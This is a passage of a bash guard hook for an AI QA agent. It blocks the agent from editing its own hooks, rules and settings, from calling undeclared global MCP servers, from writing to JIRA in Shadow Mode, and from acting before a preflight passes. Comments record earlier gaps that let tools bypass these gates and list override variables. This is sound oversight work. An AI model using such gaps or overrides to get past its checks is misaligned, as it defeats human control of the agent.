      if printf '%s' "$COMMAND" | grep -qiE '(sed[[:space:]]+-i|tee[[:space:]]|>>?|cp[[:space:]]|mv[[:space:]]|rm[[:space:]]|truncate|dd[[:space:]]|install[[:space:]]|rsync[[:space:]]|ed[[:space:]]|perl[[:space:]]+-[a-zA-Z]*i|ruby[[:space:]]+-[a-zA-Z]*i|git[[:space:]]+(apply|checkout|restore|reset|stash|config)|tar[[:space:]]+-|unzip[[:space:]]|ln[[:space:]]+-s?)[^;&|]*(settings\.json|settings\.local\.json|hooks\.json|\.claude-plugin/|hooks/.*\.sh|rules/|skills/|agents/|scripts/|project\.md|\.qa-guard\.json|\.git/(hooks|config))'; then
        FILE_PATH="the command line"
        block "refusing to modify a human-only file via Bash ($FILE_PATH) — guard config, hooks, rules, skills, agents, scripts, project config, and .git/ internals are human tasks."
      fi
      # 0.19.3 H6: interpreter writes to PROJECT.md / .qa-guard.json / settings
      if printf '%s' "$COMMAND" | grep -qiE '(python3?|perl|ruby|node|php)[[:space:]]' \
        && printf '%s' "$COMMAND" | grep -qiE '(open|write|writeFile|require|include|slurp|file_put_contents|File\.write)[^;&|]*(project\.md|\.qa-guard\.json|settings\.json|hooks\.json|\.git/)'; then
        FILE_PATH="the command line"
        block "refusing to modify a human-only file via an interpreter ($FILE_PATH) — guard config, project config, and .git/ internals are human tasks."
      fi ;;
    mcp__*__*)
      # Server = everything between mcp__ and the FIRST __ (the separator
      # between server and tool). Tool names contain single underscores
      # (list_group_projects) but not __ (double underscore). The old pattern
      # `s/__[^_]*$//` only stripped a trailing __segment without underscores,
      # so `mcp__gitlab__list_group_projects` parsed the server as
      # `gitlab__list_group_projects` and the gate never fired (H6).
      SERVER="$(printf '%s' "$TOOL_NAME" | sed -E 's/^mcp__//; s/__.*$//')"
      case "$SERVER" in
        playwright|atlassian|plugin_qa-agent-blueprint_*) : ;;  # blueprint servers always allowed
        *)
          if ! mcp_server_declared "$SESSION_CWD/.mcp.json" "$SERVER" && mcp_server_declared "$HOME/.claude.json" "$SERVER"; then
            block "refusing a call to MCP server '${SERVER}' — it is configured globally but not declared in this project's config (.mcp.json / opencode.json). Global MCP config may point at another project's credentials or data — and another project's data is never used here, by design. Declare the server in this project's own config to use it deliberately. Escape hatch: QA_ALLOW_GLOBAL_MCP=1."
          fi ;;
      esac ;;
  esac
fi

# 3. Shadow Mode: no JIRA write leaves the building by default (security.md →
# "Shadow mode" — on unless QA_AGENT_SHADOW=0 or the project's PROJECT.md says
# "Shadow mode: off"). Until 0.6.3 the only hook on this class was PostToolUse,
# which LOGS after the write — detection, not enforcement (audit 2026-09-18,
# finding 1). Fails safe: an unresolvable ticket key or unreadable project file
# keeps the gate closed — shadow-on is the default posture, so an ambiguous
# case must not silently open it.
# Same namespace-tolerant shape as the stop hook: the plugin-namespaced form is
# mcp__plugin_<name>_<server>__<tool> — a SINGLE underscore joins plugin name
# and server, so the prefix group ends in `_`, and `atlassian__` follows.
# executeWrite/executeDestructive are the Atlassian v2 meta-tools that run
# DEFERRED tools (e.g. uploadAttachmentToJiraIssue) — writes by definition, so
# the gate classifies them by name without parsing the inner tool (0.10.0).
# executeRead is absent on purpose: it runs read-only deferred tools
# (listJiraIssueChangelogs & co.) and must stay open.
# 0.19.4 M1: INVERTED to a read-allowlist — anything that is NOT a read verb
# is treated as a write. This closes the gap where write tools with non-
# standard names (uploadAttachmentToJiraIssue, assign, vote, watch, etc.)
# bypassed the write-denylist.
if printf '%s' "$TOOL_NAME" | grep -qiE '^mcp__([a-zA-Z0-9-]+(_[a-zA-Z0-9-]+)*_+)?atlassian__' \
  && ! printf '%s' "$TOOL_NAME" | grep -qiE '(get|search|list|download|executeRead|read)' ; then
  if [ "${QA_AGENT_SHADOW:-1}" != "0" ]; then
    # H5 (0.18.5): resolve the issue key from explicit identity fields first
    # (issueKey/issue_key/key/id) — the old regex picked the FIRST ticket-shaped
    # string anywhere in the payload, so a comment mentioning another ticket
    # first resolved to the wrong project (shadow bypass in multi-project homes).
    # For jira_create_issue the key does not exist yet — resolve from project_key.
    # Fall back to regex only for execute* meta-tools (nested arguments).
    ISSUE_KEY="$(get_json '
import re, json as j
ti = d.get("tool_input") or {}
direct = ti.get("issueKey") or ti.get("issue_key") or ti.get("key") or ti.get("id") or ""
if direct:
    print(str(direct))
else:
    pk = ti.get("project_key") or ti.get("projectKey") or ""
    if pk:
        print(str(pk) + "-0")
    else:
        m = re.search(r"[A-Z][A-Z0-9]+-[0-9]+", j.dumps(ti))
        print(m.group(0) if m else "")
')"
    PROJ="${ISSUE_KEY%%-*}"
    SHADOW_OFF=0
    if [ -n "$PROJ" ] && [ -f "$CWD/projects/$PROJ/PROJECT.md" ]; then
      grep -qiE 'shadow mode:[[:space:]]*off' "$CWD/projects/$PROJ/PROJECT.md" && SHADOW_OFF=1
    fi
    if [ "$SHADOW_OFF" != "1" ]; then
      block "refusing a JIRA write while Shadow Mode is on (default). Compose the report as evidence/<KEY>/<TICKET>/<ts>/proposed-report.md instead. Unlock: 'Shadow mode: off' in projects/<KEY>/PROJECT.md, or QA_AGENT_SHADOW=0."
    fi
  fi
fi

# 4. Preflight gate: no browser/JIRA MCP call before a preflight has passed.
# The classic false-positive factory is a forgotten VPN: stage and JIRA are
# unreachable and the "result" describes the environment, not the product.
# preflight.sh writes evidence/.preflight/ok.json on a full pass and REMOVES
# it on failure; this gate only checks the artifact's freshness, never probes
# the network itself (a probe per tool call would tax every call).
# Gate closed when: no artifact, unreadable, or older than the TTL — and only
# when at least one project is onboarded (nothing to preflight against
# otherwise). Escape hatch: QA_PREFLIGHT=0 (and QA_PREFLIGHT_TTL_MIN for the TTL).
if printf '%s' "$TOOL_NAME" | grep -qiE '^mcp__([a-zA-Z0-9-]+(_[a-zA-Z0-9-]+)*_+)?(playwright|atlassian)__'; then
  if [ "${QA_PREFLIGHT:-1}" != "0" ] && ls "$CWD"/projects/*/PROJECT.md >/dev/null 2>&1; then
    OK_JSON="$CWD/evidence/.preflight/ok.json"
    TTL="${QA_PREFLIGHT_TTL_MIN:-60}"
    CHECKED_AT=0
    if [ -f "$OK_JSON" ]; then
      CHECKED_AT="$(sed -n 's/.*"checked_at":[[:space:]]*\([0-9][0-9]*\).*/\1/p' "$OK_JSON" | head -1)"
      CHECKED_AT="${CHECKED_AT:-0}"
    fi
    AGE_MIN=$(( ($(date +%s) - CHECKED_AT) / 60 ))
    if [ "$AGE_MIN" -ge "$TTL" ]; then
      block "refusing browser/JIRA MCP calls before a preflight has passed (evidence/.preflight/ok.json missing or older than ${TTL}m). Run the blueprint's preflight.sh <KEY> first — it probes stage/JIRA reachability (incl. VPN hints + multiple-VPN detection) and secrets status. Override: QA_PREFLIGHT=0."
    fi
  fi
fi

exit 0
